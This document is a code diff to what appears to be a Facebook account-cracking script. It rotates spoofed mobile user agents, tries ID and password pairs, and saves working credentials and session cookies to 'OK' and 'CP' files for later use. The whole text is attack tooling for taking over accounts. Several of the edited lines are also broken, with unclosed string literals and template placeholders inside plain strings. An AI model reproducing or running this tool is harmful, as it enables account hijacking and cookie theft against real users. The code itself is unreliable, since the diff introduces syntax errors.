@@ -96,7 +96,7 @@ for xd in range(10000):
 	ugen2.append(uaku)
 
 
-	aa='Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.135 Safari/537.36'
+	aa='Mozilla/5.0 (Linux; Android 13; sdk_gphone64_arm64 Build/TPB4.220624.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30'
 	b=random.choice(['6','7','8','9','10','11','12'])
 	c='Mozilla/5.0 (Linux; Android 11; SM-A405FM Build/; wv)'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -114,7 +114,7 @@ for xd in range(10000):
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
 for x in range(10):
-	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+	a='Mozilla/5.0 (Linux; Android 13; Redfin 64-bit only Build/TP1A.220624.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30'
 	b=random.randrange(100, 9999)
 	c=random.randrange(100, 9999)
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -696,7 +696,7 @@ def crackmobile2(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				prints(Panel(f"""{H2}{idf}={pw}
 {kuki}"""))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				
 				cek_apk(session,coki)
 				break
@@ -730,8 +730,8 @@ def crackmbasic(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}{K}{idf}|{pw}')
 				print(f'\r {x}{M}{ua}{M}\n')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				#os.popen('play-audio data/cp.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw')
+				#os.popen('')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -740,7 +740,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{H}{idf}|{pw}|{kuki}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki')
 				
 				cek_apk(session,coki)
 				break
@@ -775,7 +775,7 @@ def crack(idf,pwv):
 				cetak(nel(f"ACCOUNT {cpc}"))
 				print(f'\r{x}{K}{idf}|{pw}')
 				print(f'\r {x}{B}{ua}{M}\n')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cpc,'a').write(idf+'|'+pw')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -786,7 +786,7 @@ def crack(idf,pwv):
 				cetak(nel(f"ACCOUNT {okc}"))
 				print(f'\r{H}{idf}|{pw}')
 				print(f'\r{U}{kuki}{H}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki')
 				
 				cek_apk(session,coki)
 				break
